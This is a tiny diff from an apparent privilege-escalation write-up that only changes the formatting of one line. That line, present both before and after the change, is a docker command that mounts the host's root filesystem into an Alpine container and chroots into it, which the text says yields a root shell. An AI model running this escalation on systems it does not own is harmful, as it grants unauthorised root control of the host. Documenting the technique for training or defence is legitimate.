@@ -71,6 +71,6 @@ we can also exploit docker env using alpine
 
 docker image ls
 
-``` docker run -v / :/mnt --rm -it alpine chroot /mnt sh```
+docker run -v / :/mnt --rm -it alpine chroot /mnt sh
 
 after running this docker alpine we have a root shell 
